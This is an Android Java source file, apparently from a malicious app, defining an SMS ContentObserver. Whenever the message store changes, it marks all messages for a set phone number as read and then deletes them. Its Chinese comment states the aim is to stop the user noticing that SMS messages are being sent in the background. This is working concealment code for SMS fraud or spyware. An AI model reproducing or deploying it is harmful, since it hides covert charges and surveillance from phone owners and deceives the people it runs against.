package com.littles.listeners;

import com.littles.utils.UtilSms;

import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;

public class ObserverOnSmsChange extends ContentObserver{

	private String number = "";
	private Context context;
	
	public ObserverOnSmsChange(Handler handler, String number, Context context) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.number = number;
		this.context = context;
	}

	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		try{
			//---当短信有变化时，先设置指定号码的短信为：已读；
			UtilSms.setRead(number, context);
			//---再将指定号码的所有短信记录删除；使用户无法察觉有短信在后台发送
			UtilSms.deleteSms(context, number);
		}catch(Exception e){
			e.printStackTrace();
		}
		
		
	}
	
}
